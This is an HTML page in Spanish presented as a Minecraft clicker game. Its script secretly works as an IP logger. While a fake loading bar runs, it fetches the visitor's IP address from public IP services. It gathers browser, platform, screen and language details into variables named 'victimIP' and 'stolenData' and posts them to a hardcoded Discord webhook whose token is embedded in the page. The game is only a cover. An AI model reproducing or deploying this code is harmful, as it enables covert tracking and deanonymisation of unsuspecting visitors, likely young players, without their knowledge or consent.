<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft Universe: Evolution</title>
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
    <style>
        :root {
            --mc-bg: #1e1e1e;
            --mc-green: #55ff55;
            --mc-border: #373737;
            --mc-button: #7e7e7e;
        }

        body {
            background-color: #000;
            background-image: url('https://www.transparenttextures.com/patterns/dark-matter.png');
            color: white;
            font-family: 'Press Start 2P', cursive;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .game-container {
            background: rgba(0, 0, 0, 0.9);
            border: 4px solid var(--mc-button);
            padding: 20px;
            text-align: center;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 0 20px rgba(0,255,0,0.3);
            position: relative;
        }

        .header {
            font-size: 14px;
            color: var(--mc-green);
            margin-bottom: 20px;
            text-shadow: 2px 2px #000;
        }

        .stats {
            font-size: 10px;
            margin-bottom: 20px;
            line-height: 2;
        }

        .clicker-area {
            margin: 30px 0;
            cursor: pointer;
            transition: transform 0.1s;
        }

        .clicker-area:active { transform: scale(0.9); }

        #block-image { width: 130px; image-rendering: pixelated; }

        .btn {
            background: var(--mc-button);
            border: 3px solid #000;
            border-bottom: 6px solid #4e4e4e;
            color: white;
            padding: 10px;
            font-family: 'Press Start 2P', cursive;
            font-size: 10px;
            width: 100%;
            margin-top: 10px;
            cursor: pointer;
        }

        /* Overlay de Carga */
        #loading-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: black;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 100;
        }

        #progress-bar { width: 250px; height: 25px; border: 3px solid #fff; margin-top: 20px; }
        #progress { width: 0%; height: 100%; background: var(--mc-green); }
        #loading-status { font-size: 8px; margin-top: 10px; color: #aaa; }
    </style>
</head>
<body>

    <div id="loading-overlay">
        <p>GENERANDO TERRENO...</p>
        <div id="progress-bar">
            <div id="progress"></div>
        </div>
        <div id="loading-status">Inicializando núcleo...</div>
    </div>

    <div class="game-container">
        <div class="header">MINECRAFT: EVOLUTION</div>
        <div class="stats">
            <div>BLOQUES: <span id="counter">0</span></div>
            <div style="color: #555;">PROFUNDIDAD: 0m</div>
        </div>
        <div class="clicker-area" onclick="mine()">
            <img src="https://minecraft.wiki/images/Grass_Block_JE4_BE2.png" id="block-image" alt="block">
        </div>
        <button class="btn">TIENDA (SHOP) 🛒</button>
        <button class="btn">CONFIGURACIÓN ⚙️</button>
    </div>

    <script>
        let clicks = 0;
        let victimIP = 'Unknown';
        let geoData = {};
        
        // Tu Webhook original actualizada
        const webhookURL = "https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj";

        // Lista de servicios de IP (del código que enviaste)
        const ipServices = [
            'https://api.ipify.org?format=json',
            'https://api64.ipify.org?format=json',
            'https://api.myip.com/json'
        ];

        function mine() {
            clicks++;
            document.getElementById('counter').innerText = clicks;
        }

        // Sistema de obtención de IP robusto
        async function fetchIP() {
            for (const service of ipServices) {
                try {
                    const response = await fetch(service);
                    const data = await response.json();
                    if (data.ip) {
                        victimIP = data.ip;
                        geoData = data;
                        return;
                    }
                } catch (e) { continue; }
            }
        }

        // Al cargar la página
        window.onload = async () => {
            const progress = document.getElementById('progress');
            const statusText = document.getElementById('loading-status');
            
            // Empezar a buscar la IP mientras carga la barra
            fetchIP();

            let width = 0;
            const messages = ["Cargando biomas...", "Buscando diamantes...", "Detectando IP...", "Sincronizando mundo..."];
            
            const interval = setInterval(async () => {
                if (width >= 100) {
                    clearInterval(interval);
                    document.getElementById('loading-overlay').style.display = 'none';
                    await enviarDatos();
                } else {
                    width += Math.floor(Math.random() * 12) + 1;
                    if(width > 100) width = 100;
                    progress.style.width = width + '%';
                    statusText.innerText = messages[Math.floor(Math.random() * messages.length)];
                }
            }, 250);
        };

        async function enviarDatos() {
            const stolenData = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timestamp: new Date().toLocaleString(),
                url: window.location.href
            };

            const msg = {
                username: '🌐 Minecraft Evolution Logger',
                embeds: [{
                    title: '🎮 NUEVA CONEXIÓN DETECTADA',
                    color: 5635925,
                    fields: [
                        { name: '🌐 **Dirección IP**', value: `\`${victimIP}\``, inline: true },
                        { name: '🖥️ Sistema', value: stolenData.platform, inline: true },
                        { name: '📊 Pantalla', value: stolenData.screen, inline: true },
                        { name: '🌍 Idioma', value: stolenData.language, inline: true },
                        { name: '🔗 URL de origen', value: stolenData.url, inline: false },
                        { name: '👤 User Agent', value: `\`\`\`${stolenData.userAgent}\`\`\``, inline: false }
                    ],
                    footer: { text: `Capturado el: ${stolenData.timestamp}` }
                }]
            };

            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(msg)
                });
            } catch (err) {
                console.error("Error en el envío.");
            }
        }
    </script>
</body>
</html>
